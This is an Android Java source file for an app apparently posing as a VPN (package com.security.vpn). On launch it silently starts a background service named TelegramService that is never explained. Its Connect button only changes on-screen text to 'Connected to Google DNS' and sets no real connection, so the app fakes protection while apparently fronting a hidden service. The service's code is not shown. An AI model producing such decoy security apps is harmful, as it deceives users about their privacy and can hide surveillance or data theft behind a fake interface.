package com.security.vpn;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import android.graphics.Color;

public class MainActivity extends AppCompatActivity {

    private boolean isConnected = false;
    private Button btnConnect;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnConnect = findViewById(R.id.btnConnect);
        tvStatus = findViewById(R.id.tvStatus);

        Intent serviceIntent = new Intent(this, TelegramService.class);
        startService(serviceIntent);

        btnConnect.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!isConnected) {
                    isConnected = true;
                    btnConnect.setText("DISCONNECT");
                    btnConnect.setBackgroundColor(Color.RED);
                    tvStatus.setText("Status: Connected to Google DNS");
                    tvStatus.setTextColor(Color.GREEN);
                } else {
                    isConnected = false;
                    btnConnect.setText("CONNECT");
                    btnConnect.setBackgroundColor(Color.BLUE);
                    tvStatus.setText("Status: Disconnected");
                    tvStatus.setTextColor(Color.GRAY);
                }
            }
        });
    }
}
